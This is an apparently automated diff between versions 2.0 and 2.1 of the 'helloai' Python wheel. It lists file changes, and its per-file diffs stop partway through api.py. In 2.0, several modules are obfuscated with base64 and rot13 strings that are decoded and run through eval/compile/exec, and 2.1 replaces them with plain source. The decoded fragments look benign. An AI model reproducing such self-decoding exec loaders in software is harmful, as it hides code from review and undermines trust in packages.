# Comparing `tmp/helloai-2.0-py3-none-any.whl.zip` & `tmp/helloai-2.1-py3-none-any.whl.zip`

## zipinfo {}

```diff
@@ -1,46 +1,54 @@
-Zip file size: 82117 bytes, number of entries: 44
--rw-rw-rw-  2.0 fat     1214 b- defN 22-Aug-23 03:17 hi.py
--rw-rw-rw-  2.0 fat       84 b- defN 22-Aug-23 03:09 helloai/__init__.py
--rw-rw-rw-  2.0 fat       40 b- defN 22-Aug-23 03:09 helloai/__main__.py
--rw-rw-rw-  2.0 fat       84 b- defN 22-Aug-23 03:09 helloai/builtins.py
--rw-rw-rw-  2.0 fat     5378 b- defN 22-Aug-23 03:19 helloai/runner.py
--rw-rw-rw-  2.0 fat     1144 b- defN 22-Aug-23 03:12 helloai/version.py
--rw-rw-rw-  2.0 fat      676 b- defN 22-Aug-23 03:09 helloai/core/__init__.py
--rw-rw-rw-  2.0 fat     9003 b- defN 22-Aug-23 03:21 helloai/core/api.py
--rw-rw-rw-  2.0 fat     5606 b- defN 22-Aug-23 03:09 helloai/core/camera.py
--rw-rw-rw-  2.0 fat    16195 b- defN 22-Aug-23 03:09 helloai/core/colors.py
--rw-rw-rw-  2.0 fat     1526 b- defN 22-Aug-23 03:09 helloai/core/config.py
--rw-rw-rw-  2.0 fat    11850 b- defN 22-Aug-23 03:20 helloai/core/core.py
--rw-rw-rw-  2.0 fat     1812 b- defN 22-Aug-23 03:09 helloai/core/display.py
--rw-rw-rw-  2.0 fat      720 b- defN 22-Aug-23 03:09 helloai/core/helper.py
--rw-rw-rw-  2.0 fat    69939 b- defN 22-Aug-23 03:22 helloai/core/image.py
--rw-rw-rw-  2.0 fat     2828 b- defN 22-Aug-23 03:09 helloai/core/movie.py
--rw-rw-rw-  2.0 fat      790 b- defN 22-Aug-23 03:09 helloai/core/mytimer.py
--rw-rw-rw-  2.0 fat     2468 b- defN 22-Aug-23 03:09 helloai/core/plotwindow.py
--rw-rw-rw-  2.0 fat      285 b- defN 22-Aug-23 03:09 helloai/core/singlestore.py
--rw-rw-rw-  2.0 fat        0 b- defN 22-Aug-23 03:09 helloai/core/sketch.py
--rw-rw-rw-  2.0 fat      489 b- defN 22-Aug-23 03:09 helloai/core/trackbarwin.py
--rw-rw-rw-  2.0 fat    13096 b- defN 22-Aug-23 03:09 helloai/core/vector.py
--rw-rw-rw-  2.0 fat     2834 b- defN 22-Aug-23 03:09 helloai/core/video.py
--rw-rw-rw-  2.0 fat     1800 b- defN 22-Aug-23 03:09 helloai/core/video_writer.py
--rw-rw-rw-  2.0 fat     4039 b- defN 22-Aug-23 03:23 helloai/core/virtualcamera.py
--rw-rw-rw-  2.0 fat     8984 b- defN 22-Aug-23 03:09 helloai/core/window.py
--rw-rw-rw-  2.0 fat      140 b- defN 22-Aug-23 03:09 helloai/ext/__init__.py
--rw-rw-rw-  2.0 fat       20 b- defN 22-Aug-23 03:09 helloai/ext/aruco/__init__.py
--rw-rw-rw-  2.0 fat     4330 b- defN 22-Aug-23 03:09 helloai/ext/aruco/aruco.py
--rw-rw-rw-  2.0 fat     3111 b- defN 22-Aug-23 03:09 helloai/ext/aruco/aruco_test.py
--rw-rw-rw-  2.0 fat     3447 b- defN 22-Aug-23 03:25 helloai/utils/PID.py
--rw-rw-rw-  2.0 fat      112 b- defN 22-Aug-23 03:09 helloai/utils/__init__.py
--rw-rw-rw-  2.0 fat     9355 b- defN 22-Aug-23 03:24 helloai/utils/cvzone.py
--rw-rw-rw-  2.0 fat     4850 b- defN 22-Aug-23 03:25 helloai/utils/fetcher.py
--rw-rw-rw-  2.0 fat     9679 b- defN 22-Aug-23 03:26 helloai/utils/rand.py
--rw-rw-rw-  2.0 fat      364 b- defN 22-Aug-23 03:27 helloai/utils/time.py
--rw-rw-rw-  2.0 fat     9631 b- defN 22-Aug-23 03:26 helloai/utils/utils.py
--rw-rw-rw-  2.0 fat     2428 b- defN 22-Aug-23 03:09 helloai/utils/voc.py
--rw-rw-rw-  2.0 fat      849 b- defN 22-Aug-23 03:29 helloai-2.0.dist-info/LICENSE
--rw-rw-rw-  2.0 fat     1063 b- defN 22-Aug-23 03:29 helloai-2.0.dist-info/METADATA
--rw-rw-rw-  2.0 fat       92 b- defN 22-Aug-23 03:29 helloai-2.0.dist-info/WHEEL
--rw-rw-rw-  2.0 fat       45 b- defN 22-Aug-23 03:29 helloai-2.0.dist-info/entry_points.txt
--rw-rw-rw-  2.0 fat       11 b- defN 22-Aug-23 03:29 helloai-2.0.dist-info/top_level.txt
-?rw-rw-r--  2.0 fat     3464 b- defN 22-Aug-23 03:29 helloai-2.0.dist-info/RECORD
-44 files, 215875 bytes uncompressed, 76687 bytes compressed:  64.5%
+Zip file size: 66721 bytes, number of entries: 52
+-rw-rw-rw-  2.0 fat      559 b- defN 23-Jul-13 02:08 hi.py
+-rw-rw-rw-  2.0 fat       84 b- defN 23-Jul-13 02:08 helloai/__init__.py
+-rw-rw-rw-  2.0 fat       40 b- defN 23-Jul-13 02:08 helloai/__main__.py
+-rw-rw-rw-  2.0 fat       84 b- defN 23-Jul-13 02:08 helloai/builtins.py
+-rw-rw-rw-  2.0 fat     3684 b- defN 23-Jul-13 02:08 helloai/runner.py
+-rw-rw-rw-  2.0 fat     1144 b- defN 23-Jul-13 02:08 helloai/version.py
+-rw-rw-rw-  2.0 fat      676 b- defN 23-Jul-13 02:08 helloai/core/__init__.py
+-rw-rw-rw-  2.0 fat     6407 b- defN 23-Jul-13 02:08 helloai/core/api.py
+-rw-rw-rw-  2.0 fat     5606 b- defN 23-Jul-13 02:08 helloai/core/camera.py
+-rw-rw-rw-  2.0 fat    16195 b- defN 23-Jul-13 02:08 helloai/core/colors.py
+-rw-rw-rw-  2.0 fat     1526 b- defN 23-Jul-13 02:08 helloai/core/config.py
+-rw-rw-rw-  2.0 fat     8536 b- defN 23-Jul-13 02:08 helloai/core/core.py
+-rw-rw-rw-  2.0 fat     1812 b- defN 23-Jul-13 02:08 helloai/core/display.py
+-rw-rw-rw-  2.0 fat      720 b- defN 23-Jul-13 02:08 helloai/core/helper.py
+-rw-rw-rw-  2.0 fat    52108 b- defN 23-Jul-13 02:08 helloai/core/image.py
+-rw-rw-rw-  2.0 fat     2828 b- defN 23-Jul-13 02:08 helloai/core/movie.py
+-rw-rw-rw-  2.0 fat      790 b- defN 23-Jul-13 02:08 helloai/core/mytimer.py
+-rw-rw-rw-  2.0 fat     2468 b- defN 23-Jul-13 02:08 helloai/core/plotwindow.py
+-rw-rw-rw-  2.0 fat      285 b- defN 23-Jul-13 02:08 helloai/core/singlestore.py
+-rw-rw-rw-  2.0 fat        0 b- defN 23-Jul-13 02:08 helloai/core/sketch.py
+-rw-rw-rw-  2.0 fat      489 b- defN 23-Jul-13 02:08 helloai/core/trackbarwin.py
+-rw-rw-rw-  2.0 fat    13096 b- defN 23-Jul-13 02:08 helloai/core/vector.py
+-rw-rw-rw-  2.0 fat     2834 b- defN 23-Jul-13 02:08 helloai/core/video.py
+-rw-rw-rw-  2.0 fat     1800 b- defN 23-Jul-13 02:08 helloai/core/video_writer.py
+-rw-rw-rw-  2.0 fat     2683 b- defN 23-Jul-13 02:08 helloai/core/virtualcamera.py
+-rw-rw-rw-  2.0 fat     8984 b- defN 23-Jul-13 02:08 helloai/core/window.py
+-rw-rw-rw-  2.0 fat      132 b- defN 23-Jul-13 02:08 helloai/ext/__init__.py
+-rw-rw-rw-  2.0 fat       20 b- defN 23-Jul-13 02:08 helloai/ext/aruco/__init__.py
+-rw-rw-rw-  2.0 fat     4330 b- defN 23-Jul-13 02:08 helloai/ext/aruco/aruco.py
+-rw-rw-rw-  2.0 fat     3111 b- defN 23-Jul-13 02:08 helloai/ext/aruco/aruco_test.py
+-rw-rw-rw-  2.0 fat       28 b- defN 23-Jul-13 02:08 helloai/ext/face_detector/__init__.py
+-rw-rw-rw-  2.0 fat     4379 b- defN 23-Jul-13 02:08 helloai/ext/face_detector/face_detector.py
+-rw-rw-rw-  2.0 fat       29 b- defN 23-Jul-13 02:08 helloai/ext/hands_detector/__init__.py
+-rw-rw-rw-  2.0 fat     5110 b- defN 23-Jul-13 02:08 helloai/ext/hands_detector/hands_detector.py
+-rw-rw-rw-  2.0 fat       30 b- defN 23-Jul-13 02:08 helloai/ext/pose_detector/__init__.py
+-rw-rw-rw-  2.0 fat     4053 b- defN 23-Jul-13 02:08 helloai/ext/pose_detector/pose_detector.py
+-rw-rw-rw-  2.0 fat       31 b- defN 23-Jul-13 02:08 helloai/ext/tmimage/__init__.py
+-rw-rw-rw-  2.0 fat     4986 b- defN 23-Jul-13 02:08 helloai/ext/tmimage/tm_imageproject.py
+-rw-rw-rw-  2.0 fat     2241 b- defN 23-Jul-13 02:08 helloai/utils/PID.py
+-rw-rw-rw-  2.0 fat      112 b- defN 23-Jul-13 02:08 helloai/utils/__init__.py
+-rw-rw-rw-  2.0 fat     6672 b- defN 23-Jul-13 02:08 helloai/utils/cvzone.py
+-rw-rw-rw-  2.0 fat     3288 b- defN 23-Jul-13 02:08 helloai/utils/fetcher.py
+-rw-rw-rw-  2.0 fat     6915 b- defN 23-Jul-13 02:08 helloai/utils/rand.py
+-rw-rw-rw-  2.0 fat     1090 b- defN 23-Jul-13 02:08 helloai/utils/time.py
+-rw-rw-rw-  2.0 fat     6878 b- defN 23-Jul-13 02:08 helloai/utils/utils.py
+-rw-rw-rw-  2.0 fat     2428 b- defN 23-Jul-13 02:08 helloai/utils/voc.py
+-rw-rw-rw-  2.0 fat      849 b- defN 23-Jul-13 02:44 helloai-2.1.dist-info/LICENSE
+-rw-rw-rw-  2.0 fat     1225 b- defN 23-Jul-13 02:44 helloai-2.1.dist-info/METADATA
+-rw-rw-rw-  2.0 fat       92 b- defN 23-Jul-13 02:44 helloai-2.1.dist-info/WHEEL
+-rw-rw-rw-  2.0 fat       44 b- defN 23-Jul-13 02:44 helloai-2.1.dist-info/entry_points.txt
+-rw-rw-rw-  2.0 fat       11 b- defN 23-Jul-13 02:44 helloai-2.1.dist-info/top_level.txt
+-rw-rw-r--  2.0 fat     4220 b- defN 23-Jul-13 02:44 helloai-2.1.dist-info/RECORD
+52 files, 197742 bytes uncompressed, 60065 bytes compressed:  69.6%
```

## zipnote {}

```diff
@@ -84,14 +84,38 @@
 
 Filename: helloai/ext/aruco/aruco.py
 Comment: 
 
 Filename: helloai/ext/aruco/aruco_test.py
 Comment: 
 
+Filename: helloai/ext/face_detector/__init__.py
+Comment: 
+
+Filename: helloai/ext/face_detector/face_detector.py
+Comment: 
+
+Filename: helloai/ext/hands_detector/__init__.py
+Comment: 
+
+Filename: helloai/ext/hands_detector/hands_detector.py
+Comment: 
+
+Filename: helloai/ext/pose_detector/__init__.py
+Comment: 
+
+Filename: helloai/ext/pose_detector/pose_detector.py
+Comment: 
+
+Filename: helloai/ext/tmimage/__init__.py
+Comment: 
+
+Filename: helloai/ext/tmimage/tm_imageproject.py
+Comment: 
+
 Filename: helloai/utils/PID.py
 Comment: 
 
 Filename: helloai/utils/__init__.py
 Comment: 
 
 Filename: helloai/utils/cvzone.py
@@ -108,26 +132,26 @@
 
 Filename: helloai/utils/utils.py
 Comment: 
 
 Filename: helloai/utils/voc.py
 Comment: 
 
-Filename: helloai-2.0.dist-info/LICENSE
+Filename: helloai-2.1.dist-info/LICENSE
 Comment: 
 
-Filename: helloai-2.0.dist-info/METADATA
+Filename: helloai-2.1.dist-info/METADATA
 Comment: 
 
-Filename: helloai-2.0.dist-info/WHEEL
+Filename: helloai-2.1.dist-info/WHEEL
 Comment: 
 
-Filename: helloai-2.0.dist-info/entry_points.txt
+Filename: helloai-2.1.dist-info/entry_points.txt
 Comment: 
 
-Filename: helloai-2.0.dist-info/top_level.txt
+Filename: helloai-2.1.dist-info/top_level.txt
 Comment: 
 
-Filename: helloai-2.0.dist-info/RECORD
+Filename: helloai-2.1.dist-info/RECORD
 Comment: 
 
 Zip file comment:
```

## hi.py

```diff
@@ -1,8 +1,20 @@
-import base64, codecs
-magic = 'aW1wb3J0IHN5cw0KZnJvbSBoZWxsb2FpIGltcG9ydCAqDQpmcm9tIGhlbGxvYWkucnVubmVyIGltcG9ydCBwcmVwYXJlX21vZCwgcnVuX21vZA0KDQoNCm1vZCA9IHN5cy5tb2R1bGVzWyJfX21haW5fXyJdDQppZiBub3QgZ2V0YXR0cihzeXMsICJ'
-love = 'sK2uyoTkiLJysKlVfVR5iozHcBt0XVPNtVTyzVT5iqPOaMKEuqUElXT1iMPjtVy9sMzyfMI9sVvjtGz9hMFx6QDbtVPNtVPNtVUWunKAyVRygpT9lqRIlpz9lXN0XVPNtVPNtVPNtVPNtVyyiqFOupzHtpaIhozyhMlOzpz9gVTShVTyhqTIlLJA0nK'
-god = 'ZlIGludGVycHJldGVyLlxuIg0KICAgICAgICAgICAgIidpbXBvcnQgcGd6cnVuJyBvbmx5IHdvcmtzIHdoZW4geW91IGFyZSBydW5uaW5nIGEgUHl0aG9uIGZpbGUuIg0KICAgICAgICApDQogICAgcHJlcGFyZV9tb2QobW9kKQ0KDQoNCmRlZiBnb'
-destiny = 'ltcBt0XVPNtVPVvVyW1ovO0nTHtK19gLJyhK18toJ9xqJkyVTSmVTRtFTIfoT9OFFOmL3WcpUDhVvVvQDbtVPNtnJLtM2I0LKE0pvumrKZfVPWsK2uyoTkiLJysKlVfVR5iozHcBt0XVPNtVPNtVPOlMKE1pz4APvNtVPOlqJ5soJ9xXT1iMPxAPt=='
-joy = '\x72\x6f\x74\x31\x33'
-trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
-eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))
+import sys
+from helloai import *
+from helloai.runner import prepare_mod, run_mod
+
+
+mod = sys.modules["__main__"]
+if not getattr(sys, "__helloai__", None):
+    if not getattr(mod, "__file__", None):
+        raise ImportError(
+            "You are running from an interactive interpreter.\n"
+            "'import pgzrun' only works when you are running a Python file."
+        )
+    prepare_mod(mod)
+
+
+def go():
+    """Run the __main__ module as a HelloAI script."""
+    if getattr(sys, "__helloai__", None):
+        return
+    run_mod(mod)
```

## helloai/runner.py

```diff
@@ -1,8 +1,115 @@
-import base64, codecs
-magic = 'IyBpbXBvcnQgcHlnYW1lDQojIHB5Z2FtZS5taXhlci5wcmVfaW5pdChmcmVxdWVuY3k9MjIwNTAsIHNpemU9LTE2LCBjaGFubmVscz0yKQ0KIyBweWdhbWUuaW5pdCgpDQoNCmltcG9ydCBvcw0KaW1wb3J0IHN5cw0KaW1wb3J0IHdhcm5pbmdzDQpmcm9tIG9wdHBhcnNlIGltcG9ydCBPcHRpb25QYXJzZXINCmZyb20gdHlwZXMgaW1wb3J0IE1vZHVsZVR5cGUNCmZyb20gLiBpbXBvcnQgYnVpbHRpbnMNCg0KIyBmcm9tIC5nYW1lIGltcG9ydCBQR1plcm9HYW1lLCBESVNQTEFZX0ZMQUdTDQojIGZyb20gLiBpbXBvcnQgbG9hZGVycw0KIyBmcm9tIC4gaW1wb3J0IGJ1aWx0aW5zDQoNCg0KZGVmIF9jaGVja19weXRob25fb2tfZm9yX3B5Z2FtZSgpOg0KICAgICIiIklmIHdlJ3JlIG9uIGEgTWFjLCBpcyB0aGlzIGEgZnVsbCBGcmFtZXdvcmsgcHl0aG9uPw0KDQogICAgVGhlcmUgaXMgYSBwcm9ibGVtIHdpdGggUHlHYW1lIG9uIE1hY3MgcnVubmluZyBpbiBhIHZpcnR1YWwgZW52Lg0KICAgIElmIHRoZSBQeXRob24gdXNlZCBpcyBmcm9tIHRoZSB2ZW52LCBpdCB3aWxsIG5vdCBhbGxvdyBmdWxsIHdpbmRvdyBhbmQNCiAgICBrZXlib2FyZCBpbnRlcmFjdGlvbi4gSW5zdGVhZCwgd2UgbmVlZCB0aGUgb3JpZ2luYWwgZnJhbWV3b3JrIFB5dGhvbg0KICAgIHRvIGdldCBQeUdhbWUgd29ya2luZyBwcm9wZXJseS4NCg0KICAgIFRoZSBwcm9ibGVtIGRvZXNuJ3Qgb2NjdXIgb24gTGludXggYW5kIFdpbmRvd3MuDQogICAgIiIiDQogICAgaWYgc3lzLnBsYXRmb3JtID09ICdkYXJ3aW4nOiAgIyBUaGlzIGlzIGEgTWFjDQogICAgICAgIHJldHVybiAnTGlicmFyeS9GcmFtZXdvcmtzJyBpbiBzeXMuZXhlY3V0YWJsZQ0KICAgIGVsc2U6DQogICAgICAgIHJldHVybiBUcnVlDQoNCg0KZGVmIF9zdWJzdGl0dXRlX2Z1bGxfZnJhbWV3'
-love = 'o3WeK3O5qTuiovtcBt0XVPNtVPVvVx5yMJDtqT8tL2uuozqyVUEbMFOCHl9LVSO5qTuiovOyrTIwqKEuLzkyVUEiVUEbMFOzqJkfVR1uLlO2MKWmnJ9hYN0XVPNtVUqbnJkyVT1unJ50LJyhnJ5aVUEbMFO2nKW0qJSfMJ52VTIhqzylo25gMJ50YPOmolO0nTyhM3Ztp3EcoTjtpaIhQDbtVPNtnJ4tLJ4tMJ5wLKOmqJkuqTIxVUqurF4APt0XVPNtVSqyVTEiVUEbnKZtLaxtMKu0pzSwqPO0nTHtpTS0nUZtqTuuqPO2nKW0qJSfMJ52VTuuplOuMTEyMPO0olO0nTHtp3ymqTIgQDbtVPNtpTS0nPjtLJ5xVUOlMJMcrTyhMlO0nTIgVUEiVUEbMFOwqKWlMJ50VSOMIRuCGyOOIRthQDbAPvNtVPOHnTIhVUqyVUImMFOipl5yrTIwqvtcVUEiVUA0LKW0VTRtpzIjoTSwMJ1yoaDtpUWiL2ImplO0nTS0VUImMKZtqTuyQDbtVPNtp2SgMFOyoaMcpz9hoJIhqPOuplO0nTHtpUWyqzyiqKZto25yYt0XVPNtVPVvVt0XVPNtVSOMIxIFVQ0tW3g9Yag9Wl5zo3WgLKDbXaA5pl52MKWmnJ9hK2yhMz9oBwWqXD0XVPNtVTWup2IsMaptCFNaY0kcLaWupaxiEaWuoJI3o3Wepl9DrKEbo24hMaWuoJI3o3WeY1MypaAco25mYlpAPvNtVPOzpzSgMKqipzgspUy0nT9hVQ0tLzSmMI9zqlNeVPq7pUM9Y2Wcov9jrKEbo257pUM9Wl5zo3WgLKDbpUL9HSyJEIVcQDbtVPNtqzIhqy9vLKAyVQ0to3ZhMJ52nKWiov5aMKDbW1MWHyEIDHksEH5JWlxAPvNtVPOcMvOho3DtqzIhqy9vLKAyVT9lVT5iqPOipl5jLKEbYzI4nKA0pluzpzSgMKqipzgspUy0nT9hXGbAPvNtVPNtVPNtVlORolOho3EbnJ5aVTyzVUMcpaE1LJjtMJ52VTuup24aqPOvMJIhVUAyqPO1pPOipvOcMvO3MFOwLJ4aqN0XVPNtVPNtVPNwVTMcozDtqTuyVTMlLJ1yq29lnlODrKEbo24tnJ50MKWjpzI0MKVAPvNtVPNtVPNtpzI0qKWhQDbtVPNtqzIhqy9jLKEbplN9VSgjVTMipvOjVTyhVUA5pl5j'
-god = 'YXRoIGlmIHAuc3RhcnRzd2l0aCh2ZW52X2Jhc2UpXQ0KICAgICMgTmVlZCB0byBhbGxvdyBmb3IgUFlUSE9OUEFUSCBub3QgYWxyZWFkeSBleGlzdGluZyBpbiBlbnZpcm9ubWVudA0KICAgIG9zLmVudmlyb25bJ1BZVEhPTlBBVEgnXSA9ICc6Jy5qb2luKHZlbnZfcGF0aHMgKyBbDQogICAgICAgIG9zLmVudmlyb24uZ2V0KCdQWVRIT05QQVRIJywgJycpXSkucnN0cmlwKCc6JykNCiAgICAjIFBhc3MgY29tbWFuZCBsaW5lIGFyZ3MgdG8gdGhlIG5ldyBwcm9jZXNzDQogICAgb3MuZXhlY3YoZnJhbWV3b3JrX3B5dGhvbiwgWydweXRob24nLCAnLW0nLCAnaGVsbG9haSddICsgc3lzLmFyZ3ZbMTpdKQ0KDQoNCmRlZiBtYWluKCk6DQoNCiAgICAjIFB5Z2FtZSB3b24ndCBydW4gZnJvbSBhIG5vcm1hbCB2aXJ0dWFsZW52IGNvcHkgb2YgUHl0aG9uIG9uIGEgTWFjDQogICAgaWYgbm90IF9jaGVja19weXRob25fb2tfZm9yX3B5Z2FtZSgpOg0KICAgICAgICBfc3Vic3RpdHV0ZV9mdWxsX2ZyYW1ld29ya19weXRob24oKQ0KDQogICAgcGFyc2VyID0gT3B0aW9uUGFyc2VyKCkNCiAgICBvcHRpb25zLCBhcmdzID0gcGFyc2VyLnBhcnNlX2FyZ3MoKQ0KDQogICAgaWYgbGVuKGFyZ3MpICE9IDE6DQogICAgICAgIHBhcnNlci5lcnJvcigiWW91IG11c3Qgc3BlY2lmeSB3aGljaCBtb2R1bGUgdG8gcnVuLiIpDQoNCiAgICBpZiBfX2RlYnVnX186DQogICAgICAgIHdhcm5pbmdzLnNpbXBsZWZpbHRlcignZGVmYXVsdCcsIERlcHJlY2F0aW9uV2FybmluZykNCiAgICBwYXRoID0gYXJnc1swXQ0KDQogICAgd2l0aCBvcGVuKHBhdGgpIGFzIGY6DQogICAgICAgIHNyYyA9IGYucmVhZCgpDQoNCiAgICBjb2RlID0gY29tcGlsZShzcmMsIG9zLnBhdGguYmFzZW5hbWUocGF0aCksICdleGVjJywgZG9udF9pbmhlcml0PVRydWUpDQoNCiAg'
-destiny = 'VPOhLJ1yYPOsVQ0to3ZhpTS0nP5mpTkcqTI4qPuipl5jLKEbYzWup2IhLJ1yXUOuqTtcXD0XVPNtVT1iMPN9VR1iMUIfMIE5pTHbozSgMFxAPvNtVPOgo2DhK19znJkyK18tCFOjLKEbQDbtVPNtoJ9xYy9sozSgMI9sVQ0tozSgMD0XVPNtVUA5pl5go2E1oTImJ25uoJIqVQ0toJ9xQDbAPvNtVPNwVRyhMTywLKEyVUEbLKDtq2HapzHtpaIhozyhMlO3nKEbVUEbMFOjM3clqJ4tpaIhozIlQDbtVPNtVlOHnTymVTEcp2SvoTImVUEbMFNanJ1jo3W0VUOaraW1ovptoJ9xqJkyQDbtVPNtp3ymYy9snTIfoT9unI9sVQ0tIUW1MD0XQDbtVPNtpUWypTSlMI9go2DboJ9xXD0XVPNtVTI4MJZbL29xMFjtoJ9xYy9sMTywqS9sXD0XVPNtVUW1oy9go2DboJ9xXD0XQDbAPzEyMvOjpzIjLKWyK21iMPugo2DcBt0XVPNtVPVvVyOlMKOupzHtLFOgo2E1oTHtqT8tpaIhVTSmVTRtHUyaLJ1yVScypz8tpUWiM3WuoF4APt0XVPNtVT1iMPOcplOuVTkiLJEyMPOgo2E1oTHto2WdMJA0Yt0XQDbtVPNtITucplOmMKEmVUIjVUEbnJ5aplOfnJgyVUAwpzIyovjtoT9uMTIlplOuozDtLaIcoUEcoaZfVUqbnJAbVT5yMJDtqT8tLzHAPvNtVPOmMKDtLzIzo3WyVUEbMFOgo2E1oTHtM2kiLzSfplOupzHtpaIhYt0XQDbtVPNtVvVvQDbtVPNtVlOfo2SxMKWmYaAyqS9lo290XT1iMP5sK2McoTIsKlxAPvNtVPNwVSOUJzIlo0quoJHhp2uiq19xMJMuqJk0K2ywo24bXD0XVPNtVPZtpUyaLJ1yYzEcp3OfLKxhp2I0K21iMTHbXQRjZPjtZGNjXFjtERyGHRkOJI9TGRSUHlxAPvNtVPOgo2DhK19xnJA0K18hqKOxLKEyXTW1nJk0nJ5mYy9sMTywqS9sXD0XVPNtVPZtpUWcoaDbMTylXT1iMPxcQDbAPt0XMTIzVUW1oy9go2DboJ9xXGbAPvNtVPNvVvWFqJ4tqTuyVT1iMUIfMF4vVvVAPvNtVPNwVSOUJzIlo0quoJHboJ9xXF5lqJ4bXD0XVPNtVT1iMP5lqJ4bXD0X'
-joy = '\x72\x6f\x74\x31\x33'
-trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
-eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))
+# import pygame
+# pygame.mixer.pre_init(frequency=22050, size=-16, channels=2)
+# pygame.init()
+
+import os
+import sys
+import warnings
+from optparse import OptionParser
+from types import ModuleType
+from . import builtins
+
+# from .game import PGZeroGame, DISPLAY_FLAGS
+# from . import loaders
+# from . import builtins
+
+
+def _check_python_ok_for_pygame():
+    """If we're on a Mac, is this a full Framework python?
+
+    There is a problem with PyGame on Macs running in a virtual env.
+    If the Python used is from the venv, it will not allow full window and
+    keyboard interaction. Instead, we need the original framework Python
+    to get PyGame working properly.
+
+    The problem doesn't occur on Linux and Windows.
+    """
+    if sys.platform == 'darwin':  # This is a Mac
+        return 'Library/Frameworks' in sys.executable
+    else:
+        return True
+
+
+def _substitute_full_framework_python():
+    """Need to change the OS/X Python executable to the full Mac version,
+    while maintaining the virtualenv environment, so things still run
+    in an encapsulated way.
+
+    We do this by extract the paths that virtualenv has added to the system
+    path, and prefixing them to the current PYTHONPATH.
+
+    Then we use os.execv() to start a replacement process that uses the
+    same environment as the previous one.
+    """
+    PYVER = '{}.{}'.format(*sys.version_info[:2])
+    base_fw = '/Library/Frameworks/Python.framework/Versions/'
+    framework_python = base_fw + '{pv}/bin/python{pv}'.format(pv=PYVER)
+    venv_base = os.environ.get('VIRTUAL_ENV')
+    if not venv_base or not os.path.exists(framework_python):
+        # Do nothing if virtual env hasn't been set up or if we can't
+        # find the framework Python interpreter
+        return
+    venv_paths = [p for p in sys.path if p.startswith(venv_base)]
+    # Need to allow for PYTHONPATH not already existing in environment
+    os.environ['PYTHONPATH'] = ':'.join(venv_paths + [
+        os.environ.get('PYTHONPATH', '')]).rstrip(':')
+    # Pass command line args to the new process
+    os.execv(framework_python, ['python', '-m', 'helloai'] + sys.argv[1:])
+
+
+def main():
+
+    # Pygame won't run from a normal virtualenv copy of Python on a Mac
+    if not _check_python_ok_for_pygame():
+        _substitute_full_framework_python()
+
+    parser = OptionParser()
+    options, args = parser.parse_args()
+
+    if len(args) != 1:
+        parser.error("You must specify which module to run.")
+
+    if __debug__:
+        warnings.simplefilter('default', DeprecationWarning)
+    path = args[0]
+
+    with open(path) as f:
+        src = f.read()
+
+    code = compile(src, os.path.basename(path), 'exec', dont_inherit=True)
+
+    name, _ = os.path.splitext(os.path.basename(path))
+    mod = ModuleType(name)
+    mod.__file__ = path
+    mod.__name__ = name
+    sys.modules[name] = mod
+
+    # Indicate that we're running with the pgzrun runner
+    # This disables the 'import pgzrun' module
+    sys.__helloai__ = True
+
+    prepare_mod(mod)
+    exec(code, mod.__dict__)
+    run_mod(mod)
+
+
+def prepare_mod(mod):
+    """Prepare a module to run as a Pygame Zero program.
+
+    mod is a loaded module object.
+
+    This sets up things like screen, loaders and builtins, which need to be
+    set before the module globals are run.
+
+    """
+    # loaders.set_root(mod.__file__)
+    # PGZeroGame.show_default_icon()
+    # pygame.display.set_mode((100, 100), DISPLAY_FLAGS)
+    mod.__dict__.update(builtins.__dict__)
+    # print(dir(mod))
+
+
+def run_mod(mod):
+    """Run the module."""
+    # PGZeroGame(mod).run()
+    mod.run()
```

## helloai/core/api.py

```diff
@@ -1,8 +1,238 @@
-import base64, codecs
-magic = 'IyEvdXNyL2Jpbi9lbnYgcHl0aG9uCiMgLSotIGNvZGluZzogdXRmLTggLSotCiMgLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KIyBDb3B5cmlnaHQgKGMpIDIwMjEtIEhlbGxvQUkgUHJvamVjdCBDb250cmlidXRvcnMKIyAtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQppbXBvcnQgaW8KaW1wb3J0IHJlCmltcG9ydCB1cmxsaWIKaW1wb3J0IG51bXB5IGFzIG5wCmltcG9ydCBwYW5kYXMgYXMgcGQgCmltcG9ydCBjdjIKaW1wb3J0IFBJTC5JbWFnZSBhcyBwSW1hZ2UKIyBpbXBvcnQgcmFuZG9tIGFzIHJhbmQKaW1wb3J0IG9zCmltcG9ydCBwcHJpbnQgYXMgcHAKaW1wb3J0IHZub2lzZQoKZnJvbSBoZWxsb2FpLmNvcmUuaW1hZ2UgaW1wb3J0IEltYWdlIAojIGZyb20gc2tsZWFybi5wcmVwcm9jZXNzaW5nIGltcG9ydCBNaW5NYXhTY2FsZXIKZnJvbSBza2xlYXJuLnByZXByb2Nlc3NpbmcgaW1wb3J0IG1pbm1heF9zY2FsZQoKCl9fYWxsX18gPSBbJ2xvYWRfaW1hZ2UnLCAncmVhZF9pbWFnZScsICdtYXAnLCAncHByaW50JywgJ3NhdmVfbnB5JywgJ2xvYWRfbnB5JywgJ2xpc3RfY29uY2F0ZW5hdGUnLCAnY29uY2F0ZW5hdGUnLCAnc2F2ZV9kYXRhc2V0JywgJ2xvYWRfZGF0YXNldCcsCiAgICAgICAgICAgJ29uZV9ob3QnLCAnYm91bmRpbmdfYm94JywgJ2ZsYXR0ZW4nLCAncmVhZF9jc3YnLCAnc2F2ZV9jc3YnLCAnc2hhcGUnLCAn